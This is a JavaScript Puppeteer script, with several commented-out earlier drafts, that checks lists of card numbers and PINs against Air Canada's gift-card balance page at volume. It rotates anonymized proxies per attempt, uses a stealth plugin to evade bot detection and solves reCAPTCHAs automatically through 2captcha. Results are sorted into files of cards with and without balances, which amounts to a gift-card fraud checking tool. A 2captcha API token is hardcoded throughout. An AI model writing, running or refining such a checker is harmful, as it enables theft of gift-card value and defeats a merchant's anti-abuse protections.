const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { executablePath } = require('puppeteer');
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha')
const proxyChain = require('proxy-chain')
const fs = require('fs');






// async function processFiles(dataFilePath, ipFilePath, successOutputFilePath, failureOutputFilePath) {
//     try {
//         // Create write streams for success and failure files
//         const successWriteStream = fs.createWriteStream(successOutputFilePath, { highWaterMark: 64 * 1024 });
//         const failureWriteStream = fs.createWriteStream(failureOutputFilePath, { highWaterMark: 64 * 1024 });

//         // Read data file and IP file simultaneously
//         const dataStream = fs.createReadStream(dataFilePath, 'utf-8');
//         const ipStream = fs.createReadStream(ipFilePath, 'utf-8');

//         // Create readline interfaces for both streams
//         const dataRl = require('readline').createInterface({ input: dataStream, crlfDelay: Infinity });
//         const ipRl = require('readline').createInterface({ input: ipStream, crlfDelay: Infinity });

//         // Iterate over IP addresses
//         const ipIterator = ipRl[Symbol.asyncIterator]();
//         const oldProxyUrl = 'http://bob:password123@proxy.example.com:8000';
//         const newProxyUrl = await proxyChain.anonymizeProxy(oldProxyUrl);

//         // Prints something like "http://127.0.0.1:45678"
//         console.log(newProxyUrl);
//         puppeteer.use(StealthPlugin());
//         puppeteer.use(
//             RecaptchaPlugin({
//                 provider: {
//                     id: '2captcha',
//                     token: '2324f16f0a18111536372997c826e4cb' // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
//                 },
//                 visualFeedback: true // colorize reCAPTCHAs (violet = detected, green = solved)
//             })
//         )
//         const browser = await puppeteer.launch({
//             args: [
//                 // `--proxy-server=${proxy}`,
//                 `--proxy-server=${newProxyUrl}`,
//                 '--incognito',
//             ],
//             headless: false,
//             ignoreHTTPSErrors: true,
//             executablePath: executablePath() // Make sure this is the correct path.
//         });

//         // Handle 'line' event for each line in the data file
//         for await (const line of dataRl) {
//             const [cardNumber, pin] = line.split(':');
//             const ipAddressObject = await ipIterator.next();
//             const ipAddress = ipAddressObject.value;

//             console.log('run enter')
//             const isValidIp = await run(cardNumber, pin, ipAddress); // Implement your logic in run()
//             console.log('run exit')

//             // Write to the appropriate stream based on the 'run' result
//             const outputStream = isValidIp ? successWriteStream : failureWriteStream;

//             const bufferFull = !outputStream.write(`${cardNumber}:${pin}\n`);

//             // If the buffer is full, wait for the drain event
//             if (bufferFull) {
//                 await new Promise(resolve => outputStream.once('drain', resolve));
//             }
//         }

//         // Close both write streams
//         successWriteStream.end();
//         failureWriteStream.end();
//     } catch (error) {
//         console.error('Error:', error);
//     }
// }

// // Example usage:
// const dataFilePath = 'data.txt';
// const ipFilePath = 'ip_addresses.txt';
// const successOutputFilePath = 'success_output.txt';
// const failureOutputFilePath = 'failure_output.txt';

// processFiles(dataFilePath, ipFilePath, successOutputFilePath, failureOutputFilePath)
//     .then(() => console.log('All processes completed.'))
//     .catch(error => console.error('Error in processFiles:', error));

// async function run(cardNumber, pin, ipAddress) {
//     console.log(pin);
//     console.log(cardNumber);
//     console.log(ipAddress);

//     const url = 'https://aircanada.buyatab.com/custom/aircanada/usd/balance.aspx';
//     // const proxy = `https://${ipAddress}`;
//     const [page] = await browser.pages();

//     await page.goto(url);

//     // fill voucher number
//     await page.type('input[name="card_number"]', cardNumber);

//     // fill pin 
//     await page.type('input[name="pin"]', pin);

//     // click check balance
//     const submit = await page.waitForSelector("#checkBalance");
//     await submit.click();
//     // Check for CAPTCHA


//     await page.solveRecaptchas()

//     // get balance text


//     const elementId = 'lblBalance';
//     await page.waitForSelector(`#${elementId}`, { timeout: 180000 });
//     const balance = await page.$eval(`#${elementId}`, el => el.textContent);
//     console.log('Balance:', balance);
//     await browser.close();
//     // Clean up
//     await proxyChain.closeAnonymizedProxy(newProxyUrl, true);
//     return checkBalance(balance);
// }




function checkBalance(balanceString) {

    console.log('enteered')
    // Extract the balance value
    const balanceMatch = balanceString.match(/(\d+\.\d+)/);
    const balance = balanceMatch ? parseFloat(balanceMatch[1]) : 0.00;

    // Check if the balance is greater than 0.00
    if (balance > 0.00) {
        console.log('truuued')
        // Perform your operation here
        return true;
    } else {
        console.log('falseed')
        // Balance is 0.00 or less
        return false;
    }

}





// // Function to process files
// async function processFiles(dataFilePath, ipFilePath, successOutputFilePath, failureOutputFilePath) {
//     try {
//         // Create write streams for success and failure files
//         const successWriteStream = fs.createWriteStream(successOutputFilePath, { highWaterMark: 64 * 1024 });
//         const failureWriteStream = fs.createWriteStream(failureOutputFilePath, { highWaterMark: 64 * 1024 });

//         // Read data file and IP file simultaneously
//         const dataStream = fs.createReadStream(dataFilePath, 'utf-8');
//         const ipStream = fs.createReadStream(ipFilePath, 'utf-8');

//         // Create readline interfaces for both streams
//         const dataRl = require('readline').createInterface({ input: dataStream, crlfDelay: Infinity });
//         const ipRl = require('readline').createInterface({ input: ipStream, crlfDelay: Infinity });

//         // Iterate over IP addresses
//         const ipIterator = ipRl[Symbol.asyncIterator]();

//         // Handle 'line' event for each line in the data file
//         for await (const line of dataRl) {
//             const [cardNumber, pin] = line.split(':');
//             const ipAddressObject = await ipIterator.next();
//             const ipAddress = ipAddressObject.value;

//             console.log('run enter');
//             const isValidIp = await run(cardNumber, pin, ipAddress, successWriteStream, failureWriteStream); // Implement your logic in run()
//             console.log('run exit');

//             // Clean up the browser page
//             await page.close();
//         }

//         // Close both write streams
//         successWriteStream.end();
//         failureWriteStream.end();
//     } catch (error) {
//         console.error('Error:', error);
//     }
// }

// // Example usage:
// const dataFilePath = 'data.txt';
// const ipFilePath = 'ip_addresses.txt';
// const successOutputFilePath = 'success_output.txt';
// const failureOutputFilePath = 'failure_output.txt';

// processFiles(dataFilePath, ipFilePath, successOutputFilePath, failureOutputFilePath)
//     .then(() => console.log('All processes completed.'))
//     .catch(error => console.error('Error in processFiles:', error));

// // Function to run scraping task
// async function run(cardNumber, pin, ipAddress, successWriteStream, failureWriteStream) {
//     try {
//         console.log(pin);
//         console.log(cardNumber);
//         console.log(ipAddress);

//         const url = 'https://aircanada.buyatab.com/custom/aircanada/usd/balance.aspx';

//         const oldProxyUrl = `http://${ipAddress}`;
//         const newProxyUrl = await proxyChain.anonymizeProxy(oldProxyUrl);

//         // Prints something like "http://127.0.0.1:45678"
//         console.log(newProxyUrl);

//         puppeteer.use(StealthPlugin());
//         puppeteer.use(
//             RecaptchaPlugin({
//                 provider: {
//                     id: '2captcha',
//                     token: '2324f16f0a18111536372997c826e4cb' // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
//                 },
//                 visualFeedback: true // colorize reCAPTCHAs (violet = detected, green = solved)
//             })
//         );

//         const browser = await puppeteer.launch({
//             args: [
//                 // `--proxy-server=${newProxyUrl}`,
//                 '--incognito',
//             ],
//             headless: false,
//             ignoreHTTPSErrors: true,
//             executablePath: executablePath() // Make sure this is the correct path.
//         });

//         const [page] = await browser.pages();

//         await page.goto(url);

//         // fill voucher number
//         await page.type('input[name="card_number"]', cardNumber);

//         // fill pin 
//         await page.type('input[name="pin"]', pin);

//         // click check balance
//         const submit = await page.waitForSelector("#checkBalance");
//         await submit.click();

//         // Check for CAPTCHA
//         await page.solveRecaptchas();

//         // get balance text
//         const elementId = 'lblBalance';
//         await page.waitForSelector(`#${elementId}`, { timeout: 180000 });
//         const balance = await page.$eval(`#${elementId}`, el => el.textContent);
//         console.log('Balance:', balance);

//         // Write to the appropriate stream based on the 'run' result
//         const outputStream = isValidIp ? successWriteStream : failureWriteStream;
//         const bufferFull = !outputStream.write(`${cardNumber}:${pin}\n`);

//         // If the buffer is full, wait for the drain event
//         if (bufferFull) {
//             await new Promise(resolve => outputStream.once('drain', resolve));
//         }

//         await browser.close();

//         // Clean up
//         await proxyChain.closeAnonymizedProxy(newProxyUrl, true);
//         return checkBalance(balance);
//     } catch (error) {
//         console.error('Error in run:', error);
//         return false;
//     }
// }







// async function openAndCloseTabsInBatches(urls, batchSize, browser) {
//     // const browser = await puppeteer.launch({ headless: false });

//     // Process batches of URLs
//     for (let i = 0; i < urls.length; i += batchSize) {
//         const batch = urls.slice(i, i + batchSize);
//         const pages = await Promise.all(batch.map(url => browser.newPage()));

//         // Perform actions on each tab in parallel
//         const actions = pages.map(async (page, index) => {
//             const url = batch[index];

//             // Navigate to the URL in the current tab
//             await page.goto(url);

//             // Perform other actions on the page if needed

//             // Close the current tab
//             await page.close();
//         });

//         // Wait for all actions to complete
//         await Promise.all(actions);
//     }

//     // Close the browser
//     await browser.close();
// }

// // Example usage
// const urlsToOpen = Array.from({ length: 10000 }, (_, i) => `https://www.google.co.in/`);
// // const batchSize = 10; // Adjust the batch size based on your system's limitations
// openAndCloseTabsInBatches(urlsToOpen, batchSize)
//     .then(() => console.log('All tabs opened and closed.'))
//     .catch(error => console.error('Error:', error));



async function processFiles(dataFilePath, ipFilePath, successOutputFilePath, failureOutputFilePath, batchSize) {
    try {
        puppeteer.use(StealthPlugin());
        puppeteer.use(
            RecaptchaPlugin({
                provider: {
                    id: '2captcha',
                    token: '2324f16f0a18111536372997c826e4cb', // Replace with your own 2CAPTCHA API key
                },
                visualFeedback: true,
            })
        );
        const browser = await puppeteer.launch({
            args: ['--incognito'],
            headless: false,
            ignoreHTTPSErrors: true,
        });
        const successWriteStream = fs.createWriteStream(successOutputFilePath, { highWaterMark: 64 * 1024 });
        const failureWriteStream = fs.createWriteStream(failureOutputFilePath, { highWaterMark: 64 * 1024 });

        const dataStream = fs.createReadStream(dataFilePath, 'utf-8');
        const ipStream = fs.createReadStream(ipFilePath, 'utf-8');

        const dataRl = require('readline').createInterface({ input: dataStream, crlfDelay: Infinity });
        const ipRl = require('readline').createInterface({ input: ipStream, crlfDelay: Infinity });

        const ipIterator = ipRl[Symbol.asyncIterator]();


        const dataBatch = [];
        const ipBatch = [];

        for await (const line of dataRl) {
            const [cardNumber, pin] = line.split(':');
            const ipAddressObject = await ipIterator.next();
            const ipAddress = ipAddressObject.value;

            // Add data to the batch
            dataBatch.push({ cardNumber, pin });
            ipBatch.push(ipAddress);

            // Check if batch size is reached
            if (dataBatch.length === batchSize) {
                await processBatch(dataBatch, ipBatch, successWriteStream, failureWriteStream, browser);

                // Clear batches
                dataBatch.length = 0;
                ipBatch.length = 0;
            }
        }

        // Process any remaining data
        if (dataBatch.length > 0) {
            await processBatch(dataBatch, ipBatch, successWriteStream, failureWriteStream, browser);
        }

        // Close both write streams
        successWriteStream.end();
        failureWriteStream.end();
        await browser.close();
    } catch (error) {
        console.error('Error:', error);
    }
}

async function processBatch(dataBatch, ipBatch, successWriteStream, failureWriteStream, browser) {


    try {
        // Open tabs in parallel
        const tabActions = dataBatch.map(async (data, index) => {
            const { cardNumber, pin } = data;
            const ipAddress = ipBatch[index];

            const isValidIp = await run(cardNumber, pin, ipAddress, browser); // Implement your logic in run()

            const outputStream = isValidIp ? successWriteStream : failureWriteStream;

            const bufferFull = !outputStream.write(`${cardNumber}:${pin}\n`);

            // If the buffer is full, wait for the drain event
            if (bufferFull) {
                await new Promise(resolve => outputStream.once('drain', resolve));
            }
        });

        // Wait for all tabs to complete
        await Promise.all(tabActions);
    } catch (error) {
        console.error('Error in processBatch:', error);
    }
}

async function run(cardNumber, pin, ipAddress, browser) {
    console.log(pin);
    console.log(cardNumber);
    console.log(ipAddress);
    const url = 'https://aircanada.buyatab.com/custom/aircanada/usd/balance.aspx';
    // Use proxyChain to anonymize the proxy
    const oldProxyUrl = `http://${ipAddress}`;
    const newProxyUrl = await proxyChain.anonymizeProxy(oldProxyUrl);
    console.log(newProxyUrl);
    // Create a new BrowserContext with the specified proxy
    const context = await browser.createIncognitoBrowserContext();
    const page = await context.newPage();
    /// Set up request interception to use the proxy
    await page.setRequestInterception(true);
    page.on('request', interceptedRequest => {
        interceptedRequest.continue({
            // You can modify other request parameters if needed
            ...interceptedRequest.headers(),
            // Set the proxy for the request
            // 'Proxy-Authorization': `Basic ${Buffer.from('your_username:your_password').toString('base64')}`,
        });
    });

    await page.goto(url);
    // Add your scraping logic here
    // fill voucher number
    await page.type('input[name="card_number"]', cardNumber);
    // fill pin 
    await page.type('input[name="pin"]', pin);
    // click check balance
    const submit = await page.waitForSelector("#checkBalance");
    await submit.click();
    // Check for CAPTCHA
    await page.solveRecaptchas()
    // get balance text
    const elementId = 'lblBalance';
    await page.waitForSelector(`#${elementId}`, { timeout: 180000 });
    const balance = await page.$eval(`#${elementId}`, el => el.textContent);
    console.log('Balance:', balance);
    // Close the context to close the associated page and release the proxy
    await context.close();
    // Clean up
    await proxyChain.closeAnonymizedProxy(newProxyUrl, true);
    return checkBalance(true); // Replace with your scraping success condition
}

// Example usage:
const dataFilePath = 'data.txt';
const ipFilePath = 'ip_addresses.txt';
const successOutputFilePath = 'success_output.txt';
const failureOutputFilePath = 'failure_output.txt';
const batchSize = 10;

processFiles(dataFilePath, ipFilePath, successOutputFilePath, failureOutputFilePath, batchSize)
    .then(() => console.log('All processes completed.'))
    .catch(error => console.error('Error:', error));






